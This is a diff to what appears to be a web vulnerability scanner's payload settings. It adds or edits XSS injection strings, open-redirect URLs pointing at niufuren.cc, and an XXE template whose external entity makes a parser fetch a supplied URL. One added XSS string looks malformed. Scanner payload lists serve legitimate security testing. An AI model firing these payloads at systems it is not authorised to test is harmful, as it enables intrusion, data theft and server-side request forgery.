@@ -105,6 +105,7 @@ XSS_Rule = {
     "script":[
         "`';!--\"<XSS>=&{()}",
         "&\"]}alert();{//",
+        "\"'><svg onload=confirm()1)>",
         "<svg onload=alert(1)>",
         "\" onfous=alert(1)\"><\"", # 事件
         "<video><source onerror=\"alert(1)\">", # H5 payload
@@ -114,7 +115,7 @@ XSS_Rule = {
 USR_Rule = {
     "redirect":[
         'http://www.niufuren.cc/usr.txt', #  Valar Morghulis
-        '//www.nifuren.cc/%2f..',
+        '@www.nifuren.cc/%2f..',
         '//jd.com@www.niufuren.cc/usr.txt'
     ],
 }
@@ -296,5 +297,4 @@ arachni_options = {
 
 
 
-XXE_payload = '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "{}">%remote;]>'''
+XXE_payload =  '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "{}">\n\n]>\n\n<r>&sp;</r>'
